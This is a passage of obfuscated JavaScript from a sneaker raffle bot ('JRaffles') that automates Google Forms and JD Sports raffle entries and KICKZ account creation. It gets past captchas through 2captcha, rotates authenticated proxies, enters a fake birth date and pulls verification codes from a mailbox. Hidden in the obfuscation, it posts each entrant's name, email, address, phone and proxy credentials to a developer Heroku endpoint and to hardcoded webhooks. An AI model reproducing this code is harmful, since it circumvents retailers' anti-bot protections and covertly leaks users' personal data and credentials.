                                        }
                                    }
                                    await _0x1e21d2(0x258);
                                    continue;
                                }
                                async function _0x532ffa() {
                                    let _0x41d8a1 = await question['$']('.oyXaNc');
                                    if (_0x41d8a1) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x31f5da['cyan'](_0x2f5aa3) + '\x0a');
                                        let _0x2a4b80 = await question['$$']('.ulDsOb');
                                        for (let _0x1d994f = 0x0; _0x1d994f < _0x2a4b80['length']; _0x1d994f++) {
                                            let _0x44c38 = await _0x2a4b80[_0x1d994f]['$eval']('span', _0x4d7293 => _0x4d7293['textContent']);
                                            console['log']('\x20(' + _0x1d994f + ')\x20' + _0x44c38);
                                        }
                                        console['log']();
                                        let _0x201b70 = await _0x402a5d['get']('option'), _0x4513a8 = await _0x2a4b80[_0x201b70['option']]['$eval']('span', _0x3dc0f6 => _0x3dc0f6['textContent']);
                                        _0x58f259[_0x4b7062 + 'Select'] = {
                                            'title': _0x2f5aa3,
                                            'answer': _0x201b70['option']['split'](',')
                                        };
                                        let _0xcb8894 = await _0x2a4b80[_0x201b70['option']]['$']('span');
                                        await _0xcb8894['click'](), _0x4b7062++;
                                        return;
                                    }
                                    let _0x14c65a = await question['$']('.Y6Myld');
                                    if (_0x14c65a) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x31f5da['cyan'](_0x2f5aa3) + '\x0a');
                                        let _0x1468c6 = await question['$$']('.ulDsOb');
                                        for (let _0x10c444 = 0x0; _0x10c444 < _0x1468c6['length']; _0x10c444++) {
                                            let _0x57ea0a = await _0x1468c6[_0x10c444]['$eval']('span', _0x451b82 => _0x451b82['textContent']);
                                            console['log']('\x20(' + _0x10c444 + ')\x20' + _0x57ea0a);
                                        }
                                        console['log']();
                                        let _0xfeb5db = await _0x402a5d['get']('option');
                                        _0x58f259[_0x4b7062 + 'Select'] = {
                                            'title': _0x2f5aa3,
                                            'answer': _0xfeb5db['option']['split'](',')
                                        };
                                        for (opt of _0x58f259[_0x4b7062 + 'Select']['answer']) {
                                            let _0x296bcc = await _0x1468c6[opt]['$']('span');
                                            await _0x296bcc['click']();
                                        }
                                        _0x4b7062++;
                                        return;
                                    }
                                    var _0xb84719 = 0x0;
                                    let _0x3642ae = Object['keys'](_0x58f259);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x31f5da['cyan'](_0x2f5aa3) + '\x0a');
                                    for (data of _0x3642ae) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0xb84719 + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0xb84719 + ')\x20' + data), _0xb84719++;
                                    }
                                    console['log']('\x20(' + _0x3642ae['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x181131 = await _0x402a5d['get']('input');
                                    if (_0x181131['input'] == _0x3642ae['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x2d17f0 = await _0x402a5d['get']('input');
                                        _0x58f259['custom' + _0x209a59] = {
                                            'title': _0x2f5aa3,
                                            'answer': '' + _0x2d17f0['input']
                                        };
                                        let _0xe96a94 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x56cf05 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0xe96a94)
                                            await _0xe96a94['type']('' + _0x58f259['custom' + _0x209a59]['answer']);
                                        else
                                            _0x56cf05 && await _0x56cf05['type']('' + _0x58f259['custom' + _0x209a59]['answer']);
                                        _0x209a59++;
                                        return;
                                    }
                                    _0x58f259['' + _0x3642ae[_0x181131['input']]] = _0x2f5aa3;
                                    let _0x359fe8 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x1ba5be = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x359fe8 && await _0x359fe8['type']('' + _0x580013[_0x17d38b]['' + _0x3642ae[_0x181131['input']]]), _0x1ba5be && await _0x1ba5be['type']('' + _0x580013[_0x17d38b]['' + _0x3642ae[_0x181131['input']]]), await _0x1e21d2(0x258);
                                }
                                await _0x532ffa(), await _0x1e21d2(0x37a);
                            }
                            let _0x5df1d8 = await _0x8ef59e['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x5df1d8)
                                return await _0x5df1d8['click'](), await _0x8ef59e['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0x3f88fc('New\x20Section'), _0x27380a();
                        }
                        await _0x27380a(), await _0x8ef59e['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x8ef59e['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x406375(_0x580013[_0x17d38b], _0x14cd77), _0x5565fc = 'no';
                        var _0x3e9c0b = await _0x3d56af(_0x580013[_0x17d38b], _0x14cd77, 'dev', ![]), _0x2b0ccf = await _0x3d56af(_0x580013[_0x17d38b], _0x14cd77, 'pub', ![]);
                        let _0x3d0d5f = _0x580013[_0x17d38b];
                        try {
                            prxdata = {
                                'username': _0xf4f7bc['replace']('#', ''),
                                'module': _0x14cd77['name'],
                                'entrydata': JSON['stringify'](_0x3d0d5f),
                                'proxy': '' + _0x31effe[_0x17d38b]
                            };
                            var _0x1ac7ad = JSON['stringify'](prxdata);
                            let _0x5d58ac = { 'headers': { 'content-type': 'application/json' } };
                            await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0x1ac7ad, _0x5d58ac);
                        } catch (_0x196916) {
                        }
                        const _0xcd90a8 = {
                            'succesDEVMSG': { 'embeds': [_0x3e9c0b] },
                            'succesPUBMSG': { 'embeds': [_0x2b0ccf] }
                        };
                        try {
                            _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0xcd90a8['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0xcd90a8['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x28ff05, _0xcd90a8['succesPUBMSG']);
                        } catch (_0xc8c408) {
                            console['log'](_0x31f5da['yellow'](_0x1a8584() + '\x20[' + _0x5f2e49[taskModule]['name'] + ']\x20Task\x20' + (_0x17d38b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xc8c408));
                        }
                        console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x14cd77['name'] + ']\x20Task\x20' + (_0x17d38b + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x209a59 != 0x0 || _0x4b7062 != 0x0 && !_0x82cbd9) && (_0x338b36['push'](_0x58f259), _0x534d99['writeFileSync']('forms/templates.json', JSON['stringify'](_0x338b36, null, 0x2), 'utf-8'));
                    } catch (_0x289324) {
                        console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x14cd77['name'] + ']\x20Task\x20' + (_0x17d38b + 0x1) + '\x20:\x20' + _0x289324)), _0x2d571f = '' + _0x289324;
                        var _0xbb66ce = await _0x3d56af(_0x580013[_0x17d38b], _0x14cd77, 'dev', !![], _0x2d571f);
                        let _0x119cf5 = {};
                        _0x119cf5['errorDEV'] = { 'embeds': [_0xbb66ce] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x119cf5['errorDEV']), await _0xa0452b(_0x5522d1, _0x119cf5['errorDEV']), _0x5565fc = 'yes';
                    } finally {
                        _0x368fc8 && _0x368fc8['close']();
                        if (_0x5565fc == 'yes' && _0x17786e != 0x5) {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x14cd77['name'] + ']\x20Task\x20' + (_0x17d38b + 0x1) + '\x20:\x20Retrying\x20(' + (_0x17786e + 0x1) + '\x20/\x205)')), _0x17d38b--, _0x17786e++;
                            continue;
                        }
                        if (_0x5565fc == 'yes' && _0x17786e == 0x5) {
                            _0x17786e = 0x0, _0x5565fc = 'no';
                            continue;
                        }
                        _0x3f88fc('Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x5594b5, _0x23c1eb, _0x1e501e) {
                var _0x3eb83b = ![], _0x2e09e9 = ![];
                if (_0x4558f2['captchaKey'] == '' || _0x4558f2['captchaKey'] == undefined)
                    return console['log'](_0x31f5da['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4558f2['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0xd5ebae = 0x0; _0xd5ebae < _0x23c1eb['length']; _0xd5ebae++) {
                    if (_0x62a08e != 'yes')
                        var _0x62a08e = '', _0x24dc5b = 0x0;
                    var _0x16b9a6, _0x11a9dd = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x23c1eb[_0xd5ebae]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x23c1eb[_0xd5ebae]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0xf4f7bc
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4558f2['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x2bc61f
                            }
                        ]
                    }];
                    const _0x2731b9 = { 'embeds': _0x11a9dd };
                    _0x4a5c1f(_0x5594b5['name'] + '\x20Task\x20' + (_0xd5ebae + 0x1) + '\x20/\x20' + _0x23c1eb['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                    try {
                        await _0x437e8(_0x23c1eb, _0xd5ebae);
                    } catch {
                        _0x62a08e = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x5b1fe9 = await _0x3d56af(_0x23c1eb[_0xd5ebae], _0x5594b5, 'dev', ![]), _0x515178 = await _0x3d56af(_0x23c1eb[_0xd5ebae], _0x5594b5, 'pub', ![]);
                    const _0x408a1e = {
                        'succesDEVMSG': { 'embeds': [_0x5b1fe9] },
                        'succesPUBMSG': { 'embeds': [_0x515178] }
                    };
                    if (_0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '')
                        try {
                            await _0xa0452b(_0x4558f2['webhook'], _0x408a1e['succesDEVMSG']);
                        } catch {
                        }
                    await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0x408a1e['succesDEVMSG']), await _0x1e21d2(0xc8);
                    try {
                        await _0xa0452b(_0x28ff05, _0x408a1e['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x23c1eb[_0xd5ebae]['Email'] == '' || _0x23c1eb[_0xd5ebae]['Url'] == '' || _0x23c1eb[_0xd5ebae]['FirstName'] == '' || _0x23c1eb[_0xd5ebae]['LastName'] == '') {
                        console['log'](_0x1a8584() + '\x20[' + _0x5f2e49[taskModule]['name'] + ']\x20Task\x20' + (_0xd5ebae + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4558f2['useRandomProxy'] = ![])
                        var _0x4b7ef9 = _0x1e501e[_0xd5ebae]['split'](':');
                    else
                        var _0x367f41 = Math['round'](Math['random']() * (_0x1e501e['length'] - 0x1)), _0x4b7ef9 = _0x1e501e[_0x367f41]['split'](':');
                    var _0x439880;
                    try {
                        _0x439880 = await _0x16ed0a['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4b7ef9[0x0] + ':' + _0x4b7ef9[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x439880 = await _0x16ed0a['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4b7ef9[0x0] + ':' + _0x4b7ef9[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x2dc40d = await _0x439880['newPage']();
                        await _0x2dc40d['authenticate']({
                            'username': '' + _0x4b7ef9[0x2],
                            'password': '' + _0x4b7ef9[0x3]
                        }), console['log'](_0x1a8584() + '\x20[' + _0x5594b5['name'] + ']\x20Task\x20' + (_0xd5ebae + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2dc40d['setRequestInterception'](!![]), _0x2dc40d['on']('request', _0x58f7de => {
                            _0x58f7de['resourceType']() === 'image' || _0x58f7de['resourceType']() === 'font' || _0x58f7de['resourceType']() === 'media' ? _0x58f7de['abort']() : _0x58f7de['continue']();
                        });
                        try {
                            await _0x2dc40d['goto']('' + _0x23c1eb[_0xd5ebae]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x2dc40d['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x1a8584() + '\x20[' + _0x5594b5['name'] + ']\x20Task\x20' + (_0xd5ebae + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2dc40d['type']('#comp_firstname', '' + _0x23c1eb[_0xd5ebae]['FirstName']), await _0x2dc40d['waitForSelector']('#comp_lastname'), await _0x2dc40d['type']('#comp_lastname', '' + _0x23c1eb[_0xd5ebae]['LastName']), await _0x2dc40d['waitForSelector']('#comp_email'), await _0x2dc40d['type']('#comp_email', '' + _0x23c1eb[_0xd5ebae]['Email']), await _0x2dc40d['waitForSelector']('#comp_paypalemail'), await _0x2dc40d['type']('#comp_paypalemail', '' + _0x23c1eb[_0xd5ebae]['Email']), await _0x2dc40d['waitForSelector']('#comp_mobile_end'), await _0x2dc40d['type']('#comp_mobile_end', '' + _0x23c1eb[_0xd5ebae]['Phone']), await _0x2dc40d['waitForSelector']('#comp_dob'), await _0x2dc40d['type']('#comp_dob', '08/09/1992'), console['log'](_0x1a8584() + '\x20[' + _0x5594b5['name'] + ']\x20Task\x20' + (_0xd5ebae + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x23c1eb[_0xd5ebae]['Size'] == 'RANDOM') {
                            const _0x27c700 = await _0x2dc40d['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4a0413 => {
                                return _0x4a0413['map'](_0x1f8ac5 => _0x1f8ac5['value']);
                            });
                            var _0x3d1836 = Math['round'](Math['random']() * (_0x27c700['length'] - 0x2));
                            await _0x2dc40d['select']('#shoesize', _0x27c700[_0x3d1836 + 0x1]), await _0x1e21d2(0x3e8);
                        } else {
                            const _0x354c4e = await _0x2dc40d['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x45904d => {
                                return _0x45904d['map'](_0x4956fd => _0x4956fd['innerText']);
                            }), _0x1180eb = await _0x2dc40d['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2e7d37 => {
                                return _0x2e7d37['map'](_0x25906b => _0x25906b['value']);
                            });
                            var _0x67eb60 = _0x23c1eb[_0xd5ebae]['Size'];
                            for (var _0x2331a6 = 0x1; _0x2331a6 < _0x1180eb['length']; _0x2331a6++) {
                                var _0x3639ec = _0x354c4e[_0x2331a6]['split']('\x20')[0x0];
                                if (_0x3639ec == _0x67eb60) {
                                    await _0x2dc40d['select']('#shoesize', _0x1180eb[_0x2331a6]);
                                    break;
                                } else {
                                    if (_0x2331a6 + 0x1 == _0x1180eb['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x2dc40d['waitForSelector']('#comp_address1'), await _0x2dc40d['type']('#comp_address1', _0x23c1eb[_0xd5ebae]['Address1'] + '\x20' + _0x23c1eb[_0xd5ebae]['HouseNumber']), await _0x2dc40d['waitForSelector']('#comp_address2'), await _0x2dc40d['type']('#comp_address2', '' + _0x23c1eb[_0xd5ebae]['Address2']), await _0x2dc40d['waitForSelector']('#comp_address2'), await _0x2dc40d['type']('#comp_address3', '' + _0x23c1eb[_0xd5ebae]['City']), await _0x2dc40d['waitForSelector']('#comp_postcode'), await _0x2dc40d['type']('#comp_postcode', '' + _0x23c1eb[_0xd5ebae]['Zip']), console['log'](_0x1a8584() + '\x20[' + _0x5594b5['name'] + ']\x20Task\x20' + (_0xd5ebae + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x1e21d2(0x4b0), await _0x2dc40d['click']('label#emailhold'), await _0x1e21d2(0x5dc), await _0x2dc40d['click']('#preauth_tandc_email\x20>\x20label'), await _0x1e21d2(0x5dc), await _0x2dc40d['click']('#submit');
                        try {
                            await _0x2dc40d['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x1a8584() + '\x20[' + _0x5594b5['name'] + ']\x20Task\x20' + (_0xd5ebae + 0x1) + '\x20:\x20' + _0x31f5da['blue']('Awaiting\x20Paypal\x20Payment')), _0x439880['on']('targetcreated', async _0x217167 => {
                            if (_0x217167['type']() === 'page') {
                                const _0x4c7383 = await _0x217167['page']();
                                async function _0x10dfe5() {
                                    try {
                                        await _0x2dc40d['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x2e09e9 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x4b0064() {
                                    try {
                                        await _0x2dc40d['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x3eb83b = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x4b0064(), _0x10dfe5(), await _0x1e21d2(0x493e0);
                            }
                        });
                        async function _0x4860f8() {
                            for (let _0x51c363 = 0x0; _0x51c363 < 0x12c; _0x51c363++) {
                                if (_0x3eb83b == !![]) {
                                    _0x62a08e = 'no', _0x406375(_0x23c1eb[_0xd5ebae], _0x5594b5), console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x5594b5['name'] + ']\x20Task\x20' + (_0xd5ebae + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '')
                                        try {
                                            await _0xa0452b(_0x4558f2['webhook'], _0x408a1e['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0x408a1e['succesDEVMSG']), await _0x1e21d2(0xc8);
                                    try {
                                        await _0xa0452b(_0x28ff05, _0x408a1e['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x2e09e9)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x1e21d2(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x1e21d2(0xbb8), await _0x2dc40d['click']('.zoid-outlet'), await _0x1e21d2(0x7d0), await _0x4860f8();
                    } catch (_0x21da6b) {
                        console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5594b5['name'] + ']\x20Task\x20' + (_0xd5ebae + 0x1) + '\x20:\x20' + _0x21da6b)), _0x16b9a6 = '' + _0x21da6b;
                        var _0x27aec1 = await _0x3d56af(_0x23c1eb[_0xd5ebae], _0x5594b5, 'dev', !![], _0x16b9a6);
                        _0x408a1e['errorDEV'] = { 'embeds': [_0x27aec1] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x408a1e['errorDEV']), await _0xa0452b(_0x5522d1, _0x408a1e['errorDEV']);
                    } finally {
                        _0x439880 && _0x439880['close']();
                        if (_0x62a08e == 'yes' && _0x24dc5b != 0x5 && _0x16b9a6 != 'Size\x20Not\x20Found') {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5594b5['name'] + ']\x20Task\x20' + (_0xd5ebae + 0x1) + '\x20:\x20Retrying\x20(' + _0x24dc5b + '\x20/\x205)')), _0xd5ebae = _0xd5ebae - 0x1, _0x24dc5b = _0x24dc5b + 0x1;
                            continue;
                        }
                        _0x62a08e == 'yes' && _0x24dc5b >= 0x5 && (_0x456859(afew[_0xd5ebae], _0x5594b5), _0x62a08e = 'no', _0x24dc5b = 0x0), console['log']('Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x47de3e, _0x4bf71b, _0x1de693) {
                    _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4558f2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4bc8f2 = 0x0; _0x4bc8f2 < _0x4bf71b['length']; _0x4bc8f2++) {
                        const _0x591309 = 'https://www.kickz.com/login';
                        if (_0x2c4a38 != 'yes')
                            var _0x2c4a38 = '', _0x1230d5 = 0x0;
                        _0x4a5c1f(_0x47de3e['name'] + '\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20/\x20' + _0x4bf71b['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                        try {
                            await _0x437e8(_0x4bf71b, _0x4bc8f2);
                        } catch {
                            _0x2c4a38 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x286eae = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0xf4f7bc
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4558f2['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2bc61f
                                }
                            ]
                        }];
                        const _0x4d8170 = { 'embeds': _0x286eae };
                        var _0x559e26 = await _0x3d56af(_0x4bf71b[_0x4bc8f2], _0x47de3e, 'acc', ![]);
                        const _0x10cfae = { 'succesDEVMSG': { 'embeds': [_0x559e26] } };
                        if (_0x4bf71b[_0x4bc8f2]['Email'] == '' || _0x4bf71b[_0x4bc8f2]['FirstName'] == '' || _0x4bf71b[_0x4bc8f2]['LastName'] == '') {
                            console['log'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x4bf71b[_0x4bc8f2]['Password'] == '' && (_0x4bf71b[_0x4bc8f2]['Password'] = 'JRaffles23!');
                        if (_0x4558f2['useRandomProxy'] = ![])
                            var _0x1119ca = _0x1de693[_0x4bc8f2]['split'](':');
                        else
                            var _0xe3e2f2 = Math['round'](Math['random']() * (_0x1de693['length'] - 0x1)), _0x1119ca = _0x1de693[_0xe3e2f2]['split'](':');
                        var _0x2c8466;
                        try {
                            _0x2c8466 = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1119ca[0x0] + ':' + _0x1119ca[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2c8466 = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1119ca[0x0] + ':' + _0x1119ca[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x39eaba = await _0x2c8466['newPage']();
                            await _0x39eaba['authenticate']({
                                'username': '' + _0x1119ca[0x2],
                                'password': '' + _0x1119ca[0x3]
                            }), console['log'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x39eaba['setRequestInterception'](!![]), _0x39eaba['on']('request', _0x364e8d => {
                                _0x364e8d['resourceType']() === 'image' || _0x364e8d['resourceType']() === 'font' || _0x364e8d['resourceType']() === 'media' ? _0x364e8d['abort']() : _0x364e8d['continue']();
                            }), await _0x39eaba['goto'](_0x591309), await _0x1e21d2(0xbb8), console['log'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x39eaba['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x39eaba['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x39eaba['waitForSelector']('#button-register'), await _0x1e21d2(0x7d0), await _0x39eaba['evaluate'](() => {
                                const _0x4ebaf8 = document['querySelector']('#button-register');
                                _0x4ebaf8['click']();
                            }), console['log'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x1e21d2(0x1388), await _0x39eaba['waitForSelector']('#customer_salutation'), await _0x39eaba['select']('#customer_salutation', 'mr'), await _0x1e21d2(0x7d0), await _0x39eaba['waitForSelector']('#customer_firstname'), await _0x39eaba['type']('#customer_firstname', '' + _0x4bf71b[_0x4bc8f2]['FirstName']), await _0x1e21d2(0x352), await _0x39eaba['waitForSelector']('#customer_lastname'), await _0x39eaba['type']('#customer_lastname', '' + _0x4bf71b[_0x4bc8f2]['LastName']), await _0x1e21d2(0x352), await _0x39eaba['type']('#email-input', '' + _0x4bf71b[_0x4bc8f2]['Email']), await _0x1e21d2(0x352), await _0x39eaba['type']('#email-confirm-input', '' + _0x4bf71b[_0x4bc8f2]['Email']), await _0x1e21d2(0x352), await _0x39eaba['type']('#register-password', '' + _0x4bf71b[_0x4bc8f2]['Password']), await _0x1e21d2(0x352), await _0x39eaba['type']('#password-confirm', '' + _0x4bf71b[_0x4bc8f2]['Password']), await _0x1e21d2(0x352), console['log'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x39eaba['click']('#consent'), await _0x1e21d2(0x1f4);
                            const _0xe2bc1 = await _0x39eaba['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0xe2bc1) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x39eaba['click']('#buttonRegister');
                            try {
                                await _0x39eaba['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x4bf71b[_0x4bc8f2]['Email']), await _0x1e21d2(0x4b0);
                            async function _0x346359() {
                                var _0xe7e58f, _0x47bffa = ![];
                                for (var _0x6ef19d = 0x0; _0x6ef19d < 0x18; _0x6ef19d++) {
                                    async function _0x2ad044() {
                                        var _0x41cf5d = new _0x48412a({
                                            'user': _0x4558f2['masterMail'],
                                            'password': _0x4558f2['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x1b8848(_0x49133e) {
                                            _0x41cf5d['openBox']('INBOX', ![], _0x49133e);
                                        }
                                        _0x41cf5d['once']('ready', function () {
                                            console['log'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x1b8848(function (_0x19b426, _0x52f076) {
                                                console['log'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x19b426)
                                                    throw _0x19b426;
                                                _0x41cf5d['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x5807bb, _0x5e6f43) {
                                                    if (!_0x5e6f43 || !_0x5e6f43['length'])
